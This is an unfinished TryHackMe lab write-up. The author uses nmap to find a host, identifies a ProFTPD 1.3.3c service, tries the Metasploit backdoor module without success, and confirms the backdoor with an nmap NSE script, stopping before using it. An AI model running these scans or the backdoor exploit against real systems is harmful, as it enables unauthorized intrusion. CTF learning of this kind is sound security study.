---
layout: page
title: MiroLabsCapstone
permalink: /Tutorials/TryHackMe/MiroLabsCapstone/
---

[TryHackMe Directory](https://zacvr.github.io/Tutorials/TryHackMe/)
<br/><br/>
<br/><br/>
<br/><br/>
Flags will be **BOLD**
<br/><br/>
<br/><br/>
<br/><br/>


LETS GET SOME ROOT!
----

Since this one is a "Black Box" scenario we need to just try everything we can



First lets find the correct IP

```nmap -n -sn 10.10.77.0-255```

<img src="/images/TryHackMe/MiroLabsCapstone/IPs.PNG">

Looks like we have 2 possible choices, lets look into them

```nmap 10.10.77.78```

```nmap 10.10.77.141```

<img src="/images/TryHackMe/MiroLabsCapstone/IP_Results.PNG">

Lets go with the "basic" IP of 78 due to having 3 common exploitable port types

Lets look for any low hanging fruit

```sudo nmap  --script vuln -p 21-80 10.10.77.78 -v```

This just seemed to freeze after 5ish minutes


Now lets try to see what is running

```nmap -Pn -sV 10.10.77.78```

<img src="/images/TryHackMe/MiroLabsCapstone/Services.PNG">

Well this looks like it could be promising... Lets lookup that ProFTPD version

```msfconsole```

```search ProFTPD 1.3.3c```

<img src="/images/TryHackMe/MiroLabsCapstone/Exploit.PNG">

We see that we may have a backdoor command we can try

```use 4```

```set RHOSTS 10.10.77.78```

```show options```

<img src="/images/TryHackMe/MiroLabsCapstone/Show.PNG">

Lets try to run it!

```run```

Annnnnnddddd..... Fail...hmmmm lets look this up

<img src="/images/TryHackMe/MiroLabsCapstone/RunFail.PNG">

(This Link)[Https://nmap.org/nsedoc/scripts/ftp-proftpd-backdoor.html]  This link shows a possible answer

**nmap --script ftp-proftpd-backdoor -p 21 <host>**

```nmap --script ftp-proftpd-backdoor -p 21 10.10.77.78```

<img src="/images/TryHackMe/MiroLabsCapstone/Backdoor.PNG">

Well.. Yay? that was a bit anticlimactic... Now how do we use it?





<br/><br/>
[TryHackMe Directory](https://zacvr.github.io/Tutorials/TryHackMe/)
